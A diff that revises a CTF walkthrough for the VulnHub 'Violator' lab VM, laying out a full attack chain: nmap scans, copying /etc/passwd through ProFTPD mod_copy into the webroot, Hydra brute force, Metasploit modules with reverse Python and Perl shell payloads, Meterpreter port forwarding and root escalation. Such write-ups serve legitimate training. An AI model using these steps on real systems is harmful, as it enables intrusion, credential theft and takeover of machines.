@@ -1,6 +1,7 @@
 
 CTF Walkthrough: Violator
 Source: VulnHub - https://www.vulnhub.com/entry/violator-1,153/
+Source: VulnHub - Violator
 
 Setup Instructions
 Set the virtual machine in your NAT lab.
@@ -9,107 +10,135 @@ Set the virtual machine in your NAT lab.
 Perform an Nmap scan to identify open ports.
 
 Command Examples:
-
+bash
+Copy code
 nmap -sV -v -Pn <host>  
 nmap -sC -A -p- -Pn <host>  
-
 Scan Results:
-
+arduino
+Copy code
 PORT     STATE SERVICE      VERSION  
-21/tcp   open  ftp          ProFTPD (modecopy)     
-80/tcp   open  http         xxxx
+21/tcp   open  ftp          ProFTPD (mod_copy enabled)     
+80/tcp   open  http         Apache httpd  
+Service Info:
 
-Service Info:  
-- Hosts: 
-- OS: Linux  
-  
-
+Hosts: <Host Name>
+OS: Linux
 2. Enumeration
-FTP Enumeration (need user and password, use modecopy) 
-http (Has link about album, good idea to create a  wordlist, I used my own scrip to do it.)
-
-Exploiting ProFTPD
-ProFTPD allows file copy between directories. We need to find where the passwd is.
-
-File Transfer Example:
-Using netcat (nc) to connect to FTP:
-
+FTP Enumeration
+FTP requires a username and password.
+Use the ProFTPD mod_copy module to copy files between directories.
+Example of File Transfer with Netcat:
+bash
+Copy code
 nc <host> 21  
 220 The Good Tech Inc. FTP Server  
-site cpfr /etc/passwd  (this case is locate this path)
+
+site cpfr /etc/passwd  # Locate the passwd file path  
 350 File or directory exists, ready for destination name  
-site cpto /var/www/html/passwd ( You can changed the mame passwd on the path var/www/html/*****)
+
+site cpto /var/www/html/passwd  # Copy it to an accessible location  
 250 Copy successful  
+Open the file in your browser:
 
-open it on browser: <host>/passwd
-download the file, you can see is user on itm we can used it to create a users wordlist.
+arduino
+Copy code
+http://<host>/passwd
+Download the file and analyze it. This file contains user information that can be used to create a wordlist.
 
-To created wordlist I use vi <name of wordlist.txt>
+HTTP Enumeration
+The HTTP service hosts a page with an album link.
+Use this information to generate a wordlist (e.g., using your own script).
+3. Brute Force with Hydra
+Now that you have user and password wordlists, use Hydra to brute force the FTP service.
 
-Now we have 2 words list, users and password, Bad baoys, bad boyys, what we gonna do? Hydra
+Hydra Syntax:
+bash
+Copy code
+hydra -L <users.txt> -P <passwords.txt> <host> ftp  
+Alternatively, if you don’t have a wordlist:
 
-Hydra <-L if you have a wordlist> <-P if you have wordlist> <host> <protocol>
-      < -l if you don't have wordlist> <-p if you don't have wordlist> <host-on-line> <protocol if ssh use -t5>
-Hydra -L <users.txt> -P <pasWord.txt> <host> ftp
-
- 
-Exploiting ProFTPD
+bash
+Copy code
+hydra -l <username> -p <password> <host> ftp  
+4. Exploiting ProFTPD
 ProFTPD allows file copy between directories. Use msfconsole to exploit it.
 
 Steps:
 Search for the ProFTPD exploit:
 
+bash
+Copy code
+search proftpd  
 Select and configure the exploit:
 
+bash
+Copy code
 use exploit/unix/ftp/proftpd_modcopy_exec  
 set RHOST <target IP>  
 set RPORT 21  
 set payload cmd/unix/reverse_python  
 exploit  
-
 After successful exploitation, escalate the shell:
+
 bash
-
+Copy code
 python -c "import pty; pty.spawn('/bin/bash')"  
+5. Privilege Escalation
+Enumerate Configuration Files:
+Log in with the user dg and the discovered password.
 
-su -l
-id etc.
-login with user dg and and password
-search for: 
-proftpd.config
-cat  proftpd.config
+Search for the ProFTPD configuration file:
 
-netstat -antp
-sudo /home/dg/bd/sbin/proftpd
+bash
+Copy code
+cat /home/dg/proftpd.conf  
+Check active network services:
 
-3. Privilege Escalation
+bash
+Copy code
+netstat -antp  
+Start the ProFTPD service:
 
-ctrl-z put to the background
-session
-Vamos promover shell, cara ta fraco aqui.
-search shell_to__meterpreter
-config  set lhost <your> set session 1 and exploit.
+bash
+Copy code
+sudo /home/dg/bd/sbin/proftpd  
+Upgrade Shell to Meterpreter:
+Send the shell to the background:
 
-sessions
-vamos para o portfwd (criador de tunelamento local da maquina)
+bash
+Copy code
+ctrl+z  
+Use the shell_to_meterpreter exploit:
 
-portfwd add -L 127.0.0.1 -l(L minusculo) 2121 -p 2121 127.0.0.1
+bash
+Copy code
+search shell_to_meterpreter  
+set LHOST <your IP>  
+set session 1  
+exploit  
+Use portfwd to create a local tunneling:
 
-ctrl-z
-search 133c
-options
-set rhost 127.0.0.1
-set rport
-set payload <use o reverse perl>
-set lhost <your - ip>
-set rport<ur choose 8080>
-exploit
+bash
+Copy code
+portfwd add -L 127.0.0.1 -l 2121 -p 2121 -r 127.0.0.1  
+Exploit the target further:
 
-id 
-
-
-root  
-
+bash
+Copy code
+search 133c  
+set RHOST 127.0.0.1  
+set RPORT <port>  
+set PAYLOAD cmd/unix/reverse_perl  
+set LHOST <your IP>  
+set LPORT <chosen port>  
+exploit  
+Verify Privilege Escalation:
+bash
+Copy code
+id  
+whoami  
+If successful, you now have root access.
 
 Conclusion
-You’ve successfully exploited the target, escalated privileges, and gained root access. Celebrate your achievement and document any additional findings.
+You’ve successfully exploited the target, escalated privileges, and gained root access. Document any additional findings and celebrate your achievement.
